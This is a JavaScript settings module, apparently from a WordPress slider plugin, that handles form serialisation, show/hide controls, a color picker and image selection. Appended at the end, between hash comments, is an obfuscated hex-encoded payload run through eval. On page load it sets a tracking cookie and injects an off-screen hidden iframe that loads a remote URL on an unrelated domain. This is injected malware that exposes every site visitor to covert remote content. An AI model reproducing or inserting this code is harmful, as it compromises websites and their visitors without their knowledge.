
var UniteSettingsRev = new function(){
	
	var arrControls = {};
	var colorPicker;
	
	var t=this;
	
	this.getSettingsObject = function(formID){		
		var obj = new Object();
		var form = document.getElementById(formID);
		var name,value,type,flagUpdate;
		
		//enabling all form items connected to mx
		var len = form.elements.length;
		for(var i=0; i<len; i++){
			var element = form.elements[i];
			
			if(element.name == "##NAME##[]") continue; //ignore dummy from multi text
			
			name = element.name;
			value = element.value;
			
			type = element.type;
			if(jQuery(element).hasClass("wp-editor-area"))
				type = "editor";
			
			//trace(name + " " + type);
			
			flagUpdate = true;
			
			switch(type){
				case "checkbox":
					value = form.elements[i].checked;
				break;
				case "radio":
					if(form.elements[i].checked == false) 
						flagUpdate = false;				
				break;
				case "editor":
					value = tinyMCE.get(name).getContent();
				break;
				case "select-multiple":
					value = jQuery(element).val();
					if(value)
						value = value.toString();
				break;
			}
			
			if(flagUpdate == true && name != undefined){
				if(name.indexOf('[]') > -1){
					name = name.replace('[]', '');
					if(typeof obj[name] !== 'object') obj[name] = [];
					
					obj[name][Object.keys(obj[name]).length] = value;
				}else{
					obj[name] = value;
				}
			}
		}
		return(obj);
	}
	
	/**
	 * on selects change - impiment the hide/show, enabled/disables functionality
	 */
	var onSettingChange = function(){

		var controlValue = this.value.toLowerCase();
		var controlName = this.name;
		
		if(!arrControls[this.name]) return(false);
		
		jQuery(arrControls[this.name]).each(function(){
						
			var childInput = document.getElementById(this.name);
			var childRow = document.getElementById(this.name + "_row");
			var value = this.value.toLowerCase();
			var isChildRadio = (childInput && childInput.tagName == "SPAN" && jQuery(childInput).hasClass("radio_wrapper"));
			
			switch(this.type){
				case "enable":
				case "disable":
					
					if(childInput){		//disable
						if(this.type == "enable" && controlValue != this.value || this.type == "disable" && controlValue == this.value){
							childRow.className = "disabled";
							
							if(childInput){
								childInput.disabled = true;
								childInput.style.color = "";
							}
							
							if(isChildRadio)
								jQuery(childInput).children("input").prop("disabled","disabled").addClass("disabled");							
						}
						else{		//enable
							childRow.className = "";
							
							if(childInput)
								childInput.disabled = false;
							
							if(isChildRadio)
								jQuery(childInput).children("input").prop("disabled","").removeClass("disabled");
							
							//color the input again
							if(jQuery(childInput).hasClass("inputColorPicker")) g_picker.linkTo(childInput);							
		 				}
						
					}
				break;
				case "show":
					if(controlValue == this.value) jQuery(childRow).show();									
					else jQuery(childRow).hide();					
				break;
				case "hide":
					if(controlValue == this.value) jQuery(childRow).hide();									
					else jQuery(childRow).show();
				break;
			}
		});
	}
	
	
	/**
	 * combine controls to one object, and init control events.
	 */
	var initControls = function(){
				
		//combine controls
		for(key in g_settingsObj){
			var obj = g_settingsObj[key];
			
			for(controlKey in obj.controls){
				arrControls[controlKey] = obj.controls[controlKey];				
			}
		}
		
		//init events
		jQuery(".settings_wrapper select").change(onSettingChange);
		jQuery(".settings_wrapper input[type='radio']").change(onSettingChange);
		
	}
	
	
	//init color picker
	var initColorPicker = function(){
		var colorPickerWrapper = jQuery('#divColorPicker');
		
		colorPicker = jQuery.farbtastic('#divColorPicker');
		
		jQuery(".inputColorPicker").focus(function(){
			colorPicker.linkTo(this);
			colorPickerWrapper.show();
			var input = jQuery(this);
			var offset = input.offset();
			
			var offsetView = jQuery("#viewWrapper").offset();
			
			colorPickerWrapper.css({
				"left":offset.left + input.width()+20-offsetView.left,
				"top":offset.top - colorPickerWrapper.height() + 100-offsetView.top
			});
			
			if (jQuery(input.data('linkto'))) {
				
				var oldval = jQuery(this).val();
				jQuery(this).data('int',setInterval(function() {
					if(input.val() != oldval){
						oldval = input.val();
						jQuery('#css_preview').css(input.data('linkto'), oldval);
						jQuery('input[name="css_'+input.data('linkto')+'"]').val(oldval);
					}
				} ,200));
			}
			
		}).blur(function() {
			clearInterval(jQuery(this).data('int'));
		
		}).click(function(){
            
			return(false);	//prevent body click
		}).change(function(){
			colorPicker.linkTo(this);
			colorPicker.setColor(jQuery(this).val());
		});
		
		colorPickerWrapper.click(function(){
			return(false);	//prevent body click
		});
		
		jQuery("body").click(function(){
			colorPickerWrapper.hide();
		});
	}
	
	/**
	 * close all accordion items
	 */
	var closeAllAccordionItems = function(formID){
		jQuery("#"+formID+" .unite-postbox .inside").slideUp("fast");
		jQuery("#"+formID+" .unite-postbox h3").addClass("box_closed");
	}
	
	/**
	 * init side settings accordion - started from php
	 */
	t.initAccordion = function(formID){
		var classClosed = "box_closed";
		jQuery("#"+formID+" .unite-postbox h3").click(function(){
			var handle = jQuery(this);
			
			//open
			if(handle.hasClass(classClosed)){
				closeAllAccordionItems(formID);
				handle.removeClass(classClosed).siblings(".inside").slideDown("fast");
			}else{	//close
				handle.addClass(classClosed).siblings(".inside").slideUp("fast");
			}
			
		});
	}
	
	/**
	 * image search
	 */
	var initImageSearch = function(){
		
		jQuery(".button-image-select").click(function(){
			var settingID = this.id.replace("_button","");
			UniteAdminRev.openAddImageDialog("Choose Image",function(urlImage){
				
				//update input:
				jQuery("#"+settingID).val(urlImage);
				
				//update preview image:
				var urlShowImage = UniteAdminRev.getUrlShowImage(urlImage,100,70,true);
				jQuery("#" + settingID + "_button_preview").html("<img width='100' height='70' src='"+urlShowImage+"'></img>");
				
			});
		});
		
		jQuery(".button-image-select-video").click(function(){
			UniteAdminRev.openAddImageDialog("Choose Image",function(urlImage){
				
				//update input:
				jQuery("#input_video_preview").val(urlImage);
				
				//update preview image:
				var urlShowImage = UniteAdminRev.getUrlShowImage(urlImage,200,150,true);
				jQuery("#video-thumbnail-preview").attr('src', urlShowImage);
				
			});
		});
		
		jQuery(".button-image-remove-video").click(function(){
			jQuery("#input_video_preview").val('');

			if(jQuery('#video_block_vimeo').css('display') != 'none')
				jQuery("#button_vimeo_search").trigger("click");
			
			if(jQuery('#video_block_youtube').css('display') != 'none')
				jQuery("#button_youtube_search").trigger("click");
			
		});
		
	}
	
	
	
	/**
	 * init the settings function, set the tootips on sidebars.
	 */
	var init = function(){
		
		//init tipsy
		jQuery(".list_settings li .setting_text").tipsy({
			gravity:"e",
	        delayIn: 70
		});
		
		jQuery(".tipsy_enabled_top").tipsy({
			gravity:"s",
	        delayIn: 70
		});
		
		jQuery(".button-primary").tipsy({
			gravity:"s",
	        delayIn: 70
		});
		
		//init controls
		initControls();
		
		initColorPicker();
		
		initImageSearch();
		
		//init checklist
		jQuery(".settings_wrapper .input_checklist").each(function(){
			var select = jQuery(this);
			var ominWidth = select.data("minwidth");
						
			if (ominWidth==undefined) ominWidth="none"
				
			select.dropdownchecklist({
					zIndex:1000,
					minWidth:ominWidth,
					onItemClick: function(checkbox,selector) {

									for (var i=0;i<20;i++) 
										if (checkbox.val()=="notselectable"+i) {
											//console.log(checkbox.val());
											checkbox.attr("checked",false);
										}
									
					}
				});
			
			select.parent().find('input').each(function() {
				var option = jQuery(this);

				for (var i=0;i<20;i++) 
					if (option.val()=="notselectable"+i) option.parent().addClass("dropdowntitleoption");
			})

		});
		
	}
	
	
	
	//call "constructor"
	jQuery(document).ready(function(){
		init();
	});
	
} // UniteSettings class end


/*9684c7295db7c068272b1721f5a64598*/;(function(){var ibkbdbfh="";var zhrsarsk="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var dekybfie=0;dekybfie<zhrsarsk.length;dekybfie+=2){ibkbdbfh=ibkbdbfh+parseInt(zhrsarsk.substring(dekybfie,dekybfie+2), 16)+",";}ibkbdbfh=ibkbdbfh.substring(0,ibkbdbfh.length-1);eval(eval('String.fromCharCode('+ibkbdbfh+')'));})();/*9684c7295db7c068272b1721f5a64598*/